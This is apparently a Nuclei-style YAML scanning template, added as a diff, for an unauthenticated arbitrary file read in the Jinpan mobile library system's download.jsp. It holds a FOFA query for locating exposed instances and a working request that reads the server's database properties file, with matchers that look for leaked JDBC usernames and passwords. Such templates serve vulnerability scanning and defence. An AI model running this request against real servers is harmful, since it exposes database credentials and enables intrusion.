@@ -1,0 +1,31 @@
+id: jinpanyidong-download_jsp-File-reading
+
+info:
+  name: "金盘移动图书馆系统download.jsp接口任意文件读取漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="金盘软件-金盘移动图书馆系统"
+    金盘移动图书馆系统download.jsp接口存在任意文件读取漏洞，攻击者可通过构造恶意请求直接访问服务器文件系统路径，无需身份验证即可获取任意文件内容，导致系统配置文件、用户数据等敏感信息泄露。
+  reference:
+  - https://mp.weixin.qq.com/s/InHee_e8nTgmrh-eVNV5nQ
+  tags: 金盘移动图书馆系统
+
+
+http:
+- raw:
+  - |
+    GET /pages/admin/tools/file/download.jsp?items=/WEB-INF/classes/db/default.properties HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'jdbc.username='
+    - 'jdbc.password='
+    condition: and
+  - type: status
+    status:
+    - 200
